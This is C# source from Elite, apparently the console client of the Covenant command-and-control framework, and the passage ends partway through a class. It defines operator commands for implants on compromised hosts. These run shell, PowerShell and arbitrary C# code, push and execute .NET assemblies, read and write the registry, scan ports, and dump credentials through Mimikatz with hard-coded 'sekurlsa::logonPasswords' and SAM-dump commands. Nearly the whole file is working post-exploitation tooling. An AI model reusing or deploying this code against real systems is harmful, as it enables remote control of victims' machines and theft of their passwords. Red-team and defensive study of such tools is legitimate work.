﻿// Author: Ryan Cobb (@cobbr_io)
// Project: Elite (https://github.com/cobbr/Elite)
// License: GNU GPLv3

using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;

using Microsoft.Rest;

using Covenant.API;
using Covenant.API.Models;

using Elite.Menu.Tasks;

namespace Elite.Menu.Grunts
{
    public class MenuCommandGruntInteractShow : MenuCommand
    {
        public MenuCommandGruntInteractShow(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Show";
            this.Description = "Show details of the Grunt.";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            try
            {
                menuItem.Refresh();
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                Grunt grunt = gruntInteractMenuItem.Grunt;
                EliteConsoleMenu menu = new EliteConsoleMenu(EliteConsoleMenu.EliteConsoleMenuType.Parameter, "Grunt: " + grunt.Name);
                menu.Rows.Add(new List<string> { "Name:", grunt.Name });
                menu.Rows.Add(new List<string> { "CommType:", grunt.CommType.ToString() });
                menu.Rows.Add(new List<string> { "Connected Grunts:", String.Join(",", grunt.Children.Select(C => {
                    try
                    {
                        return this.CovenantClient.ApiGruntsGuidByGuidGet(C).Name;
                    }
                    catch (HttpOperationException)
                    {
                        return null;
                    }
                }).Where(C => C != null)) });
                menu.Rows.Add(new List<string> { "Hostname:", grunt.Hostname });
                menu.Rows.Add(new List<string> { "IPAdress:", grunt.IpAddress });
                menu.Rows.Add(new List<string> { "User:", grunt.UserDomainName + "\\" + grunt.UserName });
                menu.Rows.Add(new List<string> { "Status:", grunt.Status.ToString() });
                menu.Rows.Add(new List<string> { "LastCheckIn:", grunt.LastCheckIn.ToString() });
                menu.Rows.Add(new List<string> { "ActivationTime:", grunt.ActivationTime.ToString() });
                menu.Rows.Add(new List<string> { "Integrity:", grunt.Integrity.ToString() });
                menu.Rows.Add(new List<string> { "OperatingSystem:", grunt.OperatingSystem });
                menu.Rows.Add(new List<string> { "Process:", grunt.Process });
                menu.Rows.Add(new List<string> { "Delay:", grunt.Delay.ToString() });
                menu.Rows.Add(new List<string> { "Jitter:", grunt.Jitter.ToString() });
                menu.Rows.Add(new List<string> { "ConnectAttempts:", grunt.ConnectAttempts.ToString() });
                menu.Rows.Add(new List<string> { "Tasks Assigned:",
                    String.Join(",", this.CovenantClient.ApiGruntsByIdTaskingsGet(grunt.Id ?? default).Select(T => T.Name))
                });
                menu.Rows.Add(new List<string> { "Tasks Completed:",
                String.Join(",", this.CovenantClient.ApiGruntsByIdTaskingsGet(grunt.Id ?? default)
                                    .Where(GT => GT.Status == GruntTaskingStatus.Completed)
                                    .Select(T => T.Name))
                });
                menu.Print();
            }
            catch (HttpOperationException e)
            {
                EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
            }
        }
    }

    public class MenuCommandGruntInteractSet : MenuCommand
    {
        public MenuCommandGruntInteractSet(CovenantAPI CovenantClient) : base(CovenantClient)
        {
            this.Name = "Set";
            this.Description = "Set a Grunt Variable.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "Option",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "Delay" },
                        new MenuCommandParameterValue { Value = "Jitter" },
                        new MenuCommandParameterValue { Value = "ConnectAttempts" }
                    }
                },
                new MenuCommandParameter { Name = "Value" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            menuItem.Refresh();
            Grunt grunt = ((GruntInteractMenuItem)menuItem).Grunt;
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count != 3 || commands[0].ToLower() != "set")
            {
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else if (this.Parameters.FirstOrDefault(P => P.Name == "Option").Values.Select(V => V.Value.ToLower()).Contains(commands[1].ToLower()))
            {
                if (int.TryParse(commands[2], out int n))
                {
                    GruntTasking tasking = null;
                    if (commands[1].ToLower() == "delay")
                    {
                        tasking = new GruntTasking
                        {
                            Id = 0,
                            GruntId = grunt.Id,
                            TaskId = 1,
                            Status = GruntTaskingStatus.Uninitialized,
                            Type = GruntTaskingType.SetDelay,
                            TaskingMessage = n.ToString(),
                            TaskingCommand = UserInput,
                            TokenTask = false
                        };
                    }
                    else if (commands[1].ToLower() == "jitter")
                    {
                        tasking = new GruntTasking
                        {
                            Id = 0,
                            GruntId = grunt.Id,
                            TaskId = 1,
                            Status = GruntTaskingStatus.Uninitialized,
                            Type = GruntTaskingType.SetJitter,
                            TaskingMessage = n.ToString(),
                            TaskingCommand = UserInput,
                            TokenTask = false
                        };
                    }
                    else if (commands[1].ToLower() == "connectattempts")
                    {
                        tasking = new GruntTasking
                        {
                            Id = 0,
                            GruntId = grunt.Id,
                            TaskId = 1,
                            Status = GruntTaskingStatus.Uninitialized,
                            Type = GruntTaskingType.SetConnectAttempts,
                            TaskingMessage = n.ToString(),
                            TaskingCommand = UserInput,
                            TokenTask = false,
                        };
                    }
                    try
                    {
                        this.CovenantClient.ApiGruntsByIdTaskingsPost(grunt.Id ?? default, tasking);
                    }
                    catch (HttpOperationException e)
                    {
                        EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
                    }
                }
                else
                {
                    menuItem.PrintInvalidOptionError(UserInput);
                }
            }
            else
            {
                menuItem.PrintInvalidOptionError(UserInput);
            }
        }
    }

    public class MenuCommandGruntInteractWhoAmI : MenuCommand
    {
        public MenuCommandGruntInteractWhoAmI()
        {
            this.Name = "whoami";
            this.Description = "Gets the username of the currently used/impersonated token.";
            this.Parameters = new List<MenuCommandParameter> { };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: whoami");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "WhoAmI" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractListDirectory : MenuCommand
    {
        public MenuCommandGruntInteractListDirectory()
        {
            this.Name = "ls";
            this.Description = "Get a listing of the current directory.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Path" },
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ls <path>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ListDirectory" });
                if (commands.Count() > 1)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Path " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractChangeDirectory : MenuCommand
    {
        public MenuCommandGruntInteractChangeDirectory()
        {
            this.Name = "cd";
            this.Description = "Change the current directory.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Append Directory" },
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify Directory to change to.");
                EliteConsole.PrintFormattedErrorLine("Usage: cd <append_directory>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ChangeDirectory" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set AppendDirectory " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractProcessList : MenuCommand
    {
        public MenuCommandGruntInteractProcessList()
        {
            this.Name = "ps";
            this.Description = "Get a list of currently running processes.";
            this.Parameters = new List<MenuCommandParameter> { };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: ps");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ProcessList" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractRegistryRead : MenuCommand
    {
        public MenuCommandGruntInteractRegistryRead()
        {
            this.Name = "RegistryRead";
            this.Description = "Reads a value stored in registry.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "RegPath",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_USER\\" },
                        new MenuCommandParameterValue { Value = "HKEY_LOCAL_MACHINE\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CLASSES_ROOT\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_CONFIG\\" },
                    }
                }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 2)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: RegistryRead <regpath>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "RegistryRead" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set RegPath " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractRegistryWrite : MenuCommand
    {
        public MenuCommandGruntInteractRegistryWrite()
        {
            this.Name = "RegistryWrite";
            this.Description = "Writes a value into the registry.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "RegPath",
                    Values = new List<MenuCommandParameterValue> {
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_USER\\" },
                        new MenuCommandParameterValue { Value = "HKEY_LOCAL_MACHINE\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CLASSES_ROOT\\" },
                        new MenuCommandParameterValue { Value = "HKEY_CURRENT_CONFIG\\" },
                    }
                },
                new MenuCommandParameter { Name = "Value" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() != 3)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: RegistryWrite <regpath> <value>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "RegistryWrite" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set RegPath " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Value " + commands[2]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractUpload : MenuCommand
    {
        public MenuCommandGruntInteractUpload()
        {
            this.Name = "Upload";
            this.Description = "Upload a file.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "File Path",
                    Values = new MenuCommandParameterValuesFromFilePath(Common.EliteDataFolder)
                }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify FilePath of File to upload.");
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else if (commands.Count > 2)
            {
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Upload" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set FilePath " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractDownload : MenuCommand
    {
        public MenuCommandGruntInteractDownload()
        {
            this.Name = "Download";
            this.Description = "Download a file.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "File Name" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify FileName to download.");
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else if (commands.Count > 2)
            {
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Download" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set FileName " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractAssembly : MenuCommand
    {
        public MenuCommandGruntInteractAssembly()
        {
            this.Name = "Assembly";
            this.Description = "Execute a .NET Assembly EntryPoint.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "Assembly Path",
                    Values = new MenuCommandParameterValuesFromFilePath(Common.EliteDataFolder)
                },
                new MenuCommandParameter { Name = "Parameters" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify AssemblyPath containing Assembly to execute.");
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Assembly" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set AssemblyPath " + commands[1]);
                if (commands.Count > 2)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Parameters " + String.Join(" ", commands.GetRange(2, commands.Count() - 2)));
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractAssemblyReflect : MenuCommand
    {
        public MenuCommandGruntInteractAssemblyReflect()
        {
            this.Name = "AssemblyReflect";
            this.Description = "Execute a .NET Assembly method using reflection.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "Assembly Path",
                    Values = new MenuCommandParameterValuesFromFilePath(Common.EliteDataFolder)
                },
                new MenuCommandParameter { Name = "Type Name" },
                new MenuCommandParameter { Name = "Method Name" },
                new MenuCommandParameter { Name = "Parameters" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify AssemblyPath containing Assembly to execute.");
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else if (commands.Count > 5)
            {
                menuItem.PrintInvalidOptionError(UserInput);
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "AssemblyReflect" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set AssemblyPath " + commands[1]);
                if (commands.Count > 2)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set TypeName " + commands[2]);
                }
                if (commands.Count > 3)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set MethodName " + commands[3]);
                }
                if (commands.Count > 4)
                {
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Parameters " + commands[4]);
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractSharpShell : MenuCommand
    {
        private static string WrapperFunctionFormat = @"
using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Security;
using System.Security.Principal;
using System.Collections.Generic;

using SharpSploit.Credentials;
using SharpSploit.Enumeration;
using SharpSploit.Execution;
using SharpSploit.Generic;
using SharpSploit.Misc;

public static class Task
{{
    public static object Execute()
    {{
        {0}
    }}
}}
";

        public MenuCommandGruntInteractSharpShell()
        {
            this.Name = "SharpShell";
            this.Description = "Execute C# code.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "C# Code" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify C# code to run.");
                EliteConsole.PrintFormattedErrorLine("Usage: SharpShell <c#_code>");
            }
            else
            {
                try
                {
                    string csharpcode = String.Join(" ", commands.GetRange(1, commands.Count() - 1));
                    int gruntTaskId = (menuItem.CovenantClient.ApiGrunttasksGet().Select(GT => GT.Id).Max() ?? default(int)) + 1;
                    GruntTask task = menuItem.CovenantClient.ApiGrunttasksPost(new GruntTask
                    {
                        Id = gruntTaskId,
                        Name = "SharpShell" + gruntTaskId,
                        Description = "Execute custom c# code from SharpShell.",
                        ReferenceAssemblies = new List<string> { "System.DirectoryServices.dll", "System.IdentityModel.dll", "System.Management.dll", "System.Management.Automation.dll" },
                        ReferenceSourceLibraries = new List<string> { "SharpSploit" },
                        EmbeddedResources = new List<string>(),
                        Code = String.Format(WrapperFunctionFormat, csharpcode),
                        Options = new List<GruntTaskOption>()
                    });

                    Grunt grunt = ((GruntInteractMenuItem)menuItem).Grunt;
                    GruntTasking gruntTasking = new GruntTasking
                    {
                        Id = 0,
                        Name = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10),
                        TaskId = task.Id,
                        GruntId = grunt.Id,
                        Status = GruntTaskingStatus.Uninitialized,
                        Type = GruntTaskingType.Assembly
                    };
                    GruntTasking postedGruntTasking = menuItem.CovenantClient.ApiGruntsByIdTaskingsPost(grunt.Id ?? default, gruntTasking);

                    if (postedGruntTasking != null)
                    {
                        EliteConsole.PrintFormattedHighlightLine("Started Task: " + task.Name + " on Grunt: " + grunt.Name + " as GruntTask: " + postedGruntTasking.Name);
                    }
                }
                catch (HttpOperationException e)
                {
                    EliteConsole.PrintFormattedWarningLine("CovenantException: " + e.Response.Content);
                }
            }
        }
    }

    public class MenuCommandGruntInteractShell : MenuCommand
    {
        public MenuCommandGruntInteractShell()
        {
            this.Name = "Shell";
            this.Description = "Execute a Shell command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Shell Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a ShellCommand.");
                EliteConsole.PrintFormattedErrorLine("Usage: Shell <shell_command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Shell" });
                string ShellCommandInput = String.Join(" ", commands.GetRange(1, commands.Count() - 1));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ShellCommand " + ShellCommandInput);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractShellCmd : MenuCommand
    {
        public MenuCommandGruntInteractShellCmd()
        {
            this.Name = "ShellCmd";
            this.Description = "Execute a Shell command using \"cmd.exe /c\".";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Shell Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a ShellCommand.");
                EliteConsole.PrintFormattedErrorLine("Usage: ShellCmd <shell_command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "ShellCmd" });
                string ShellCommandInput = String.Join(" ", commands.GetRange(1, commands.Count() - 1));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ShellCommand " + ShellCommandInput);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractPowerShell : MenuCommand
    {
        public MenuCommandGruntInteractPowerShell()
        {
            this.Name = "PowerShell";
            this.Description = "Execute a PowerShell command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "PowerShell Code" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = UserInput.Split(" ").ToList();
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify PowerShellCode to run.");
                EliteConsole.PrintFormattedErrorLine("Usage: PowerShell <powershell_code>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "PowerShell" });
                string PowerShellCodeInput = "";
                if (gruntInteractMenuItem.PowerShellImport != "")
                {
                    PowerShellCodeInput = gruntInteractMenuItem.PowerShellImport;
                    if (!PowerShellCodeInput.Trim().EndsWith(";")) { PowerShellCodeInput = PowerShellCodeInput.Trim() + ";\r\n"; }
                }
                PowerShellCodeInput += String.Join(" ", commands.GetRange(1, commands.Count() - 1));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set PowerShellCommand " + PowerShellCodeInput);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractPowerShellImport : MenuCommand
    {
        public MenuCommandGruntInteractPowerShellImport()
        {
            this.Name = "PowerShellImport";
            this.Description = "Import a local PowerShell file.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter {
                    Name = "File Path",
                    Values = new MenuCommandParameterValuesFromFilePath(Common.EliteDataFolder)
                }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify path to file to import.");
                EliteConsole.PrintFormattedErrorLine("Usage: PowerShellImport <file_path>");
            }
            else
            {
                string filename = commands[1];
                if (!File.Exists(filename))
                {
                    EliteConsole.PrintFormattedErrorLine("Local file path \"" + filename + "\" does not exist.");
                }
                else
                {
                    GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                    string read = File.ReadAllText(filename);
                    gruntInteractMenuItem.PowerShellImport += read;

                    TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                    task.ValidateMenuParameters(new string[] { "PowerShell" });
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set PowerShellCommand " + read);
                    task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                    task.LeavingMenuItem();
                }
            }
        }
    }

    public class MenuCommandGruntInteractPortScan : MenuCommand
    {
        public MenuCommandGruntInteractPortScan()
        {
            this.Name = "PortScan";
            this.Description = "Conduct a TCP port scan of specified hosts and ports.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Computer Names" },
                new MenuCommandParameter { Name = "Ports" },
                new MenuCommandParameter { Name = "Ping" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 3 || commands.Count() > 4)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: PortScan <computer_names> <ports> [<ping>]");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "PortScan" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set ComputerNames " + commands[1]);
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Ports " + commands[2]);
                if (commands.Count() == 4)
                {
                    if (commands[3].ToLower() == "true" || commands[3].ToLower() == "false")
                    {
                        task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Ping " + commands[3]);
                    }
                    else
                    {
                        EliteConsole.PrintFormattedErrorLine("Ping must be either \"True\" or \"False\"");
                        EliteConsole.PrintFormattedErrorLine("Usage: PortScan <computer_names> <ports> [<ping>]");
                        return;
                    }
                }
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractMimikatz : MenuCommand
    {
        public MenuCommandGruntInteractMimikatz()
        {
            this.Name = "Mimikatz";
            this.Description = "Execute a Mimikatz command.";
            this.Parameters = new List<MenuCommandParameter> {
                new MenuCommandParameter { Name = "Command" }
            };
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 2)
            {
                EliteConsole.PrintFormattedErrorLine("Must specify a Mimikatz command.");
                EliteConsole.PrintFormattedErrorLine("Usage: Mimikatz <command>");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Mimikatz" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command " + String.Join(" ", commands.GetRange(1, commands.Count() - 1)));
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractLogonPasswords : MenuCommand
    {
        public MenuCommandGruntInteractLogonPasswords()
        {
            this.Name = "LogonPasswords";
            this.Description = "Execute the Mimikatz command \"sekurlsa::logonPasswords\".";
            this.Parameters = new List<MenuCommandParameter>();
        }

        public override void Command(MenuItem menuItem, string UserInput)
        {
            List<string> commands = Utilities.ParseParameters(UserInput);
            if (commands.Count() < 1)
            {
                EliteConsole.PrintFormattedErrorLine("Usage: LogonPasswords");
            }
            else
            {
                GruntInteractMenuItem gruntInteractMenuItem = (GruntInteractMenuItem)menuItem;
                TaskMenuItem task = (TaskMenuItem)gruntInteractMenuItem.MenuOptions.FirstOrDefault(O => O.MenuTitle == "Task");
                task.ValidateMenuParameters(new string[] { "Mimikatz" });
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Set").Command(task, "Set Command privilege::debug sekurlsa::logonPasswords");
                task.AdditionalOptions.FirstOrDefault(O => O.Name == "Start").Command(task, UserInput);
                task.LeavingMenuItem();
            }
        }
    }

    public class MenuCommandGruntInteractSamDump : MenuCommand
    {
        public MenuCommandGruntInteractSamDump()
        {
            this.Name = "SamDump";
            this.Description = "Execute the Mimikatz command \"lsadump::sam\".";
            this.Parameters = new List<MenuCommandParameter>();
        }

